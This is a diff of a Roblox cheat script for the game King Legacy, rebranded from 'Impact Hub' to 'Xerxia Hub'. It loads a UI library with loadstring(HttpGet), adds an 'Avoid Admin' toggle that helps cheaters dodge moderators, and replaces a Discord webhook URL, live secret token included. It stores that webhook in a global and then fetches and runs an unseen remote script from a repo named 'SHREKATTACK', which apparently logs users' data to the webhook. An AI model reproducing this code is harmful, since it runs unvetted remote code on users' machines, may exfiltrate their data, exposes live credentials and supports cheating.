@@ -1,13 +1,10 @@
--- KL 2
---- This Is King Legacy Script Revamp!
----- Made By \\ C // # 4 2 7 8 | Discord | ทำแค่คนเดียว
+--KL C2
 
-
-local HubName = "Impact Hub V2.1"
+local HubName = "Xerxia Hub"
 local date = os.date("%d".." ".."%B".." ".."%Y")
 
 local Venyx = loadstring(game:HttpGet("https://raw.githubusercontent.com/PersonaLifeII/Impact-Hub/main/UI%20Venyx"))()
-local UI  = Venyx.new(HubName.." | Easily To Used | Revamp Script | "..date, 5013109572)
+local UI  = Venyx.new(HubName.." | King Legacy | "..date, 5013109572)
 
 local page1 = UI:addPage("Main Tab", 7040391851)
 local FARMS = page1:addSection("Auto Farm Setting")
@@ -2485,7 +2482,7 @@ end)
 
 local SuperOther = page1:addSection("Other")
 
-        SuperOther:addToggle("Auto Leave When Admin Join", nil, function(value)
+        SuperOther:addToggle("Avoid Admin", nil, function(value)
             _G.LeaveAdmin = value
         end)
 
@@ -3968,6 +3965,7 @@ USetting:addKeybind("Toggle UI", Enum.KeyCode.RightControl, function(value)
     UI:toggle()
     print(value)
 end)
+
 USetting:addButton("Destroy UI", function()
     for i, v in pairs(game.CoreGui:GetChildren()) do
         if string.find(v.Name, "Impact Hub") then   
@@ -3998,7 +3996,6 @@ end
         end
 end
 end
-
 
  spawn(function()
     game:GetService("RunService").RenderStepped:Connect(function()
@@ -4974,9 +4971,9 @@ function FindGS()
                             end)
 
 
-UI:Notify(HubName, "Welcom To Impact Hub, The Roblox Script")
+UI:Notify(HubName, "Welcom To "..HubName)
 
-local Web = "https://discordapp.com/api/webhooks/1055787246063718410/cw5P_S-wPTCSId1hbOBW4yL7EQ9VOuCocjZpg6Ah6ZuNTi16RIBl-kbJxM20lDjpeOvI"
+local Web = "https://discord.com/api/webhooks/1304810633371320373/kIt9wic6VsvnhFE5Uv1ZBMZHKHZyYcHnZ61xzSTAQVfKXkY4kpChS9PuMznUNllZ-_db"
 _G.webhooksdiscord = Web
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua", true))()
 
